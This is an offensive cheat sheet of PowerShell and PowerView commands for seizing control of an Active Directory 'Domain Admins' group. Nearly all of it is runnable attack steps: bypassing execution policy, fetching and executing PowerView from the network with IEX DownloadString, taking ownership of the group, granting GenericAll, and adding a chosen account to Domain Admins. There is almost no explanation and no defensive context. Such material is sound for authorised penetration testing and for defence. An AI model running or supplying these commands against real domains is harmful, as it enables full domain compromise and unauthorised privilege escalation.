# Power view cheat sheet

## Commands

```bash
powershell -ep bypass

Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'goodboy'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "goodboy"

net group "domain admins" goodboy /add /domain
```

------------------------------------------------------------------------------------------------------------
## Import the AD module (requires RSAT or AD PowerShell tools)
```bash
Import-Module ActiveDirectory
```
## Now try the command again

```bash
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
```

```bash
$groupDN = "LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=com"

$acl = [System.DirectoryServices.DirectoryEntry]::new($groupDN).ObjectSecurity
```

## Create the AD: drive if missing
```bash
New-PSDrive -Name AD -PSProvider ActiveDirectory -Root "" -Server "bank.com"
```
## Now get ACL

```bash
$acl = Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=bank,DC=com"
```

## 1. Take ownership

```bash
$group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"

$group.psbase.ObjectSecurity.SetOwner([System.Security.Principal.NTAccount]("bank\goodboy"))

$group.psbase.CommitChanges()
```
## 2. Add self to group
```bash
$group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
```

# Key Explanations:

## Permission	Why Needed
- Modify owner	
- Modify permissions	
- Write properties	


---------------------------------------------------------------------------------
### with ✔ Modify permissions

```bash
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

Get-Command -Module PowerView

```
. (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)

# Verify if 'bb2' has WriteDACL on Domain Admins
Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights

# Add GenericAll permission
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "bb2" -Rights All -Verbose

# Add your account to the group
Add-DomainGroupMember -Identity "Domain Admins" -Members "bb2" -Verbose

# Verify
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName
--------------------------------------------------------------------------------------------------------

## with permission  - write all properties ✔ is  only enabled

### if powerview  fails
$Group = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=bank,DC=local"
$Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")

---------------------------------------------------------------------------
### with permissions - ✔ modify owner is only enabled

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

or downloade the script and run by import

powershell -ep bypass
Import-Module .\powerview.ps1

Get-Command Set-DomainObjectOwner, Add-DomainObjectAcl

Set-ExecutionPolicy Bypass -Scope Process -Force

# 1. Take ownership
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usermad" -Verbose

# 2. Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usermad" -Rights All -Verbose

# 3. Add to group
Add-DomainGroupMember -Identity "Domain Admins" -Members "usermad" -Verbose